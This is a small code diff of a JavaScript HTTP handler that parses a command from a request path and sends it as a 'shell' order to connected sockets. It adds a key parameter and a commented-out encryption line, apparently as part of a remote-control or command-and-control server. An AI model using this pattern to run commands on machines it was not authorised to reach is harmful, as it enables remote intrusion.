@@ -1,4 +1,4 @@
-function httpRes(socket, sockets, getdata){
+function httpRes(socket, sockets, getdata, privateKey){
 	//parsing command and enpoints
 	var parsing = getdata[1].split("_._/")
 	var cmdp = parsing[0].split("/command=")[1].split("%20")
@@ -11,6 +11,7 @@ function httpRes(socket, sockets, getdata){
 	endp.forEach( endpo =>{
 		sockets.forEach( sock =>{
 			if (endpo === sock["id"].replace(/['"]+/g, '')){
+				//sock.write(ciph.decrypt(`{"order": "shell", "command": "${command}"}`, privateKey))
 				sock.write(`{"order": "shell", "command": "${command}"}`)
 			};
 		});
